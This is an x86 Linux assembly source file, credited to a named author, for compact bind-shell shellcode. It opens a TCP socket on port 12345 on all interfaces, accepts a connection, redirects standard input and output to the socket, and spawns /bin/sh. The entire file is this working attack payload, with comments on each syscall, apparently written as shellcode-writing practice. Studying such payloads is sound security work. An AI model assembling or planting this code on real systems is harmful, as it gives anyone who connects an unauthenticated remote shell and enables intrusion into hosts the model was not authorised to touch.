; Filename: shell_bind_tcp_smaller.nasm
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 March
;
; DESC:
; Binds to a port 12345
; Execs Shell on incoming connection
;
; TODO:
; 1. Port number should be easily configurable;
;
;

global _start

section .text

_start:
	xor eax, eax
	mov al, 102		; socketcall
	xor ebx, ebx
	inc ebx			; 1 = SYS_SOCKET socket()
	push BYTE 6		; IPPROTO_TCP	|| 	int protocol);
	push BYTE 1		; SOCK_STREAM	|| 	int type,
	push BYTE 2		; AF_INET	|| socket(int domain,
	mov ecx, esp		; ECX - PTR to arguments for socket()
	int 0x80
	mov esi, eax		; save socket fd in ESI for later

	push BYTE 102
	pop eax			; socketcall
	inc ebx			; 2 = SYS_BIND bind()
	xor edx, edx
	push edx		; 0 = ANY HOST (0.0.0.0)}		||		struct in_addr sin_addr (unsigned long s_addr) };
	push WORD 0x3930	; PORT 12345 (reverse),			||	 	unsigned short sin_port,
	push WORD bx		; 2 = AF_INET				|| struct sockaddr { short sin_family,
	mov ecx, esp		; Save PTR to sockaddr struct in ECX
	push BYTE 16		; 	socklen_t addrlen);
	push ecx		; 	const struct sockaddr *addr,
	push esi		; bind(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for bind()
	int 0x80


	mov BYTE al, 102	; socketcall
	inc ebx
	inc ebx			; 4 = SYS_LISTEN listen()
	push BYTE 1		; 	int backlog);
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for listen()
	int 0x80


	mov BYTE al, 102	; socketcall
	inc ebx			; 5 = SYS_ACCEPT = accept()
	push edx		; 	socklen_t *addrlen = 0);
	push edx		; 	struct sockaddr *addr = NULL,
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for accept()
	int 0x80


	; dup2 to duplicate sockfd, that will attach the client to a shell
	; that we'll spawn below in execve syscall
	xchg eax, ebx		; after EBX = sockfd, EAX = 5
	push BYTE 2
	pop ecx
dup2_loop:
	mov BYTE al, 63
	int 0x80
	dec ecx
	jns dup2_loop


	; spawning as shell
	xor eax, eax
	push eax
	push 0x68732f6e		; '//bin/sh' in reverse
	push 0x69622f2f		; beginning of '//bin/sh' string is here
	mov ebx, esp
	push eax
	mov edx, esp		; ESP is now pointing to EDX
	push ebx
	mov ecx, esp
	mov al, 11		; execve
	int 0x80

